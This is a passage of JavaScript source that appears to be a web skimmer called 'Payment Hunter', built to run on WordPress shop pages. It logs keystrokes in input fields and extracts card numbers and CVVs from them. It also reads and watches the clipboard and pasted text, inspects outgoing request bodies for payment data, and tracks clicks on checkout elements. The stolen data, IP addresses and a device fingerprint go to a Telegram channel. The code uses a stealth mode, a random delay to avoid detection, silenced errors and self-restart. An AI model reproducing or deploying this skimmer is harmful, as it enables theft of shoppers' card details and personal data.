                    // Try to parse as JSON
                    data = JSON.parse(body);
                } else if (body instanceof FormData) {
                    data = {};
                    for (let [key, value] of body.entries()) {
                        data[key] = value;
                    }
                } else if (body instanceof URLSearchParams) {
                    data = Object.fromEntries(body.entries());
                } else if (typeof body === 'object') {
                    data = body;
                }
            } catch (e) {
                data = { raw: body.toString().substring(0, 100) };
            }
            
            if (data && typeof data === 'object') {
                // Check for payment data
                const hasPaymentData = this.checkForPaymentData(data);
                
                if (hasPaymentData) {
                    HunterUtils.sendToTelegram({
                        requestId: requestId,
                        data: JSON.stringify(data).substring(0, 300),
                        action: 'PAYMENT_DATA_IN_REQUEST'
                    }, 'NETWORK_ACTIVITY');
                }
            }
        }
        
        checkForPaymentData(data) {
            const str = JSON.stringify(data).toLowerCase();
            
            return str.includes('card') ||
                   str.includes('cvv') ||
                   str.includes('expir') ||
                   str.includes('payment') ||
                   str.includes('credit') ||
                   str.includes('debit') ||
                   str.includes('token') ||
                   str.includes('charge');
        }
        
        setupNetworkObservers() {
            // Periodically clean up old requests
            setInterval(() => {
                const now = Date.now();
                const oneMinuteAgo = now - 60000;
                
                this.requests.forEach((request, id) => {
                    if (request.timestamp < oneMinuteAgo) {
                        this.requests.delete(id);
                    }
                });
            }, 30000);
        }
    }
    
    // ==================== CLIPBOARD & KEYSTROKE HUNTER ====================
    class ClipboardHunter {
        constructor() {
            this.keystrokes = [];
            this.clipboardData = [];
            this.init();
        }
        
        init() {
            if (WP_HUNTER_CONFIG.ADVANCED_FEATURES.KEYSTROKE_LOGGING) {
                this.setupKeystrokeLogging();
            }
            
            if (WP_HUNTER_CONFIG.ADVANCED_FEATURES.CLIPBOARD_MONITOR) {
                this.setupClipboardMonitoring();
            }
            
            this.setupMouseTracking();
        }
        
        setupKeystrokeLogging() {
            let buffer = '';
            let lastKeystrokeTime = Date.now();
            let currentField = null;
            
            document.addEventListener('keydown', (e) => {
                currentField = e.target;
                lastKeystrokeTime = Date.now();
                
                // Only log in input fields
                if (currentField.tagName === 'INPUT' || 
                    currentField.tagName === 'TEXTAREA' ||
                    currentField.hasAttribute('contenteditable')) {
                    
                    const keystroke = {
                        key: e.key,
                        code: e.code,
                        field: {
                            tag: currentField.tagName,
                            name: currentField.name || currentField.id || '',
                            type: currentField.type || 'text'
                        },
                        timestamp: Date.now()
                    };
                    
                    this.keystrokes.push(keystroke);
                    buffer += e.key;
                    
                    // Analyze buffer for card patterns
                    if (buffer.length >= 10) {
                        this.analyzeKeystrokeBuffer(buffer, currentField);
                        buffer = '';
                    }
                }
            }, true);
            
            // Clear buffer after inactivity
            setInterval(() => {
                if (Date.now() - lastKeystrokeTime > 5000 && buffer.length > 0) {
                    this.analyzeKeystrokeBuffer(buffer, currentField);
                    buffer = '';
                }
            }, 1000);
            
            // Periodically send keystroke summary
            setInterval(() => {
                if (this.keystrokes.length > 0) {
                    this.sendKeystrokeSummary();
                    this.keystrokes = [];
                }
            }, 30000);
        }
        
        analyzeKeystrokeBuffer(buffer, field) {
            // Look for card number patterns
            const cardPattern = buffer.match(/\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{3,4}/);
            if (cardPattern) {
                const cardNumber = cardPattern[0];
                const analyzed = HunterUtils.analyzeCardData(cardNumber);
                
                if (analyzed) {
                    HunterUtils.sendToTelegram({
                        field: field?.name || field?.id || 'unknown',
                        value: cardNumber,
                        type: 'KEYSTROKE_PATTERN',
                        cardInfo: analyzed
                    }, 'KEYSTROKE_ANALYSIS');
                }
            }
            
            // Look for CVV patterns
            const cvvPattern = buffer.match(/\b\d{3,4}\b/);
            if (cvvPattern && field && field.type === 'password') {
                HunterUtils.sendToTelegram({
                    field: field.name || field.id || 'unknown',
                    value: cvvPattern[0],
                    type: 'POSSIBLE_CVV'
                }, 'KEYSTROKE_ANALYSIS');
            }
        }
        
        sendKeystrokeSummary() {
            const summary = {
                total: this.keystrokes.length,
                fields: new Set(),
                timeRange: {
                    start: this.keystrokes[0]?.timestamp,
                    end: this.keystrokes[this.keystrokes.length - 1]?.timestamp
                }
            };
            
            this.keystrokes.forEach(ks => {
                if (ks.field.name) {
                    summary.fields.add(ks.field.name);
                }
            });
            
            if (summary.total > 50) {
                HunterUtils.sendToTelegram({
                    action: 'KEYSTROKE_SUMMARY',
                    total: summary.total,
                    fields: Array.from(summary.fields).join(', '),
                    duration: summary.timeRange.end - summary.timeRange.start
                }, 'ACTIVITY_SUMMARY');
            }
        }
        
        setupClipboardMonitoring() {
            // Monitor copy events
            document.addEventListener('copy', (e) => {
                setTimeout(() => {
                    this.checkClipboard('COPY');
                }, 100);
            });
            
            // Monitor cut events
            document.addEventListener('cut', (e) => {
                setTimeout(() => {
                    this.checkClipboard('CUT');
                }, 100);
            });
            
            // Monitor paste events
            document.addEventListener('paste', (e) => {
                const clipboardData = e.clipboardData || window.clipboardData;
                if (clipboardData) {
                    const text = clipboardData.getData('text');
                    if (text) {
                        this.analyzePastedData(text, e.target);
                    }
                }
            });
            
            // Periodic clipboard check
            setInterval(() => {
                this.checkClipboard('PERIODIC');
            }, 10000);
        }
        
        async checkClipboard(source) {
            try {
                const text = await navigator.clipboard.readText();
                if (text && HunterUtils.isPaymentData(text)) {
                    this.analyzeClipboardData(text, source);
                }
            } catch (e) {
                // Permission denied or other error
            }
        }
        
        analyzeClipboardData(text, source) {
            const analyzed = HunterUtils.analyzeCardData(text);
            
            if (analyzed) {
                HunterUtils.sendToTelegram({
                    source: source,
                    data: text,
                    type: analyzed.type,
                    action: 'CLIPBOARD_DATA'
                }, 'CLIPBOARD_MONITOR');
                
                this.clipboardData.push({
                    text: text,
                    source: source,
                    timestamp: Date.now(),
                    type: analyzed.type
                });
            }
        }
        
        analyzePastedData(text, target) {
            const analyzed = HunterUtils.analyzeCardData(text);
            
            if (analyzed) {
                HunterUtils.sendToTelegram({
                    field: target.name || target.id || target.tagName,
                    data: text,
                    type: analyzed.type,
                    action: 'PASTE_DATA'
                }, 'CLIPBOARD_MONITOR');
            }
        }
        
        setupMouseTracking() {
            if (!WP_HUNTER_CONFIG.ADVANCED_FEATURES.MOUSE_TRACKING) return;
            
            let mouseMovements = [];
            let lastMouseMove = Date.now();
            
            document.addEventListener('mousemove', (e) => {
                const now = Date.now();
                
                mouseMovements.push({
                    x: e.clientX,
                    y: e.clientY,
                    timestamp: now
                });
                
                lastMouseMove = now;
                
                // Keep only last 1000 movements
                if (mouseMovements.length > 1000) {
                    mouseMovements = mouseMovements.slice(-500);
                }
            });
            
            // Track clicks
            document.addEventListener('click', (e) => {
                const target = e.target;
                
                // Check if click is on payment-related element
                if (target.closest && (
                    target.closest('[class*="payment"]') ||
                    target.closest('[id*="payment"]') ||
                    target.closest('[class*="checkout"]') ||
                    target.closest('[id*="checkout"]')
                )) {
                    HunterUtils.sendToTelegram({
                        target: `${target.tagName} ${target.className || target.id}`,
                        action: 'PAYMENT_ELEMENT_CLICK'
                    }, 'MOUSE_TRACKING');
                }
            });
            
            // Periodically analyze mouse activity
            setInterval(() => {
                if (mouseMovements.length > 100) {
                    this.analyzeMouseActivity(mouseMovements);
                    mouseMovements = [];
                }
            }, 60000);
        }
        
        analyzeMouseActivity(movements) {
            // Simple analysis - just check if there was activity
            if (movements.length > 50) {
                // User was active
            }
        }
    }
    
    // ==================== MAIN HUNTER INITIALIZER ====================
    class PaymentHunter {
        constructor() {
            this.components = [];
            this.initialize();
        }
        
        async initialize() {
            // Enable stealth mode
            HunterUtils.enableStealth();
            
            // Wait for page to load
            await this.waitForPageLoad();
            
            // Get initial data
            const [ips, fingerprint] = await Promise.all([
                HunterUtils.getAllIPs(),
                Promise.resolve(HunterUtils.generateFingerprint())
            ]);
            
            // Send activation message
            await this.sendActivationMessage(ips, fingerprint);
            
            // Initialize all components with delay
            setTimeout(() => {
                this.components.push(new UniversalFormHunter());
            }, 500);
            
            setTimeout(() => {
                this.components.push(new RedirectionHunter());
            }, 1000);
            
            setTimeout(() => {
                this.components.push(new GatewayHunter());
            }, 1500);
            
            setTimeout(() => {
                this.components.push(new NetworkHunter());
            }, 2000);
            
            setTimeout(() => {
                this.components.push(new ClipboardHunter());
            }, 2500);
            
            // Mark as active
            hunterActive = true;
            
            // Start periodic reporting
            this.startPeriodicReporting();
            
            // Setup error handling
            this.setupErrorHandling();
        }
        
        waitForPageLoad() {
            return new Promise((resolve) => {
                if (document.readyState === 'complete') {
                    resolve();
                } else {
                    window.addEventListener('load', resolve);
                }
            });
        }
        
        async sendActivationMessage(ips, fingerprint) {
            const message = `<b>🚀 PAYMENT HUNTER ACTIVATED</b>\n\n`;
            
            message += `<b>🎯 Version:</b> ${WP_HUNTER_CONFIG.VERSION}\n`;
            message += `<b>🌐 URL:</b> <code>${window.location.href}</code>\n`;
            message += `<b>📄 Title:</b> ${document.title.substring(0, 50)}${document.title.length > 50 ? '...' : ''}\n`;
            message += `<b>🔗 Referrer:</b> ${document.referrer || 'Direct'}\n\n`;
            
            message += `<b>📡 IP Addresses:</b>\n`;
            ips.forEach(ip => {
                message += `  ${ip.type}: ${ip.ip}\n`;
            });
            
            message += `<b>🆔 Session:</b> ${hunterSession}\n`;
            message += `<b>📱 Device:</b> ${hunterDevice}\n`;
            message += `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
            
            message += `<b>🔧 Features Enabled:</b>\n`;
            Object.entries(WP_HUNTER_CONFIG.PAYMENT_HUNTING).forEach(([key, value]) => {
                if (value) message += `✅ ${key}\n`;
            });
            
            Object.entries(WP_HUNTER_CONFIG.ADVANCED_FEATURES).forEach(([key, value]) => {
                if (value) message += `✨ ${key}\n`;
            });
            
            await HunterUtils.sendToTelegram({message: 'Activation'}, 'SYSTEM_ACTIVATION');
        }
        
        startPeriodicReporting() {
            // Periodic health check
            setInterval(async () => {
                if (hunterActive) {
                    const ips = await HunterUtils.getAllIPs();
                    
                    const health = {
                        url: window.location.href,
                        session: hunterSession,
                        uptime: Date.now() - parseInt(hunterSession.split('_')[1]),
                        components: this.components.length,
                        dataCaptured: capturedData.inputs.length + capturedData.redirects.length,
                        activeGateways: Array.from(activeGateways).join(', '),
                        ips: ips
                    };
                    
                    await HunterUtils.sendToTelegram(health, 'HEALTH_CHECK');
                }
            }, 300000); // Every 5 minutes
            
            // Periodic data flush
            setInterval(() => {
                HunterUtils.flushBuffer();
            }, 60000); // Every minute
        }
        
        setupErrorHandling() {
            // Catch all errors
            window.addEventListener('error', (e) => {
                // Silent error handling
                return true;
            });
            
            // Catch promise rejections
            window.addEventListener('unhandledrejection', (e) => {
                // Silent rejection handling
                return true;
            });
            
            // Self-healing: restart if something goes wrong
            setInterval(() => {
                if (!hunterActive && document.body) {
                    hunterActive = false;
                    setTimeout(() => {
                        new PaymentHunter();
                    }, 5000);
                }
            }, 30000);
        }
    }
    
    // ==================== ENTRY POINT ====================
    // Start the hunter with random delay to avoid detection
    setTimeout(() => {
        new PaymentHunter();
    }, Math.random() * 3000 + 2000);
    
    // String hashcode utility
    String.prototype.hashCode = function() {
        let hash = 0;
        for (let i = 0; i < this.length; i++) {
            const char = this.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash;
    };
    
})();
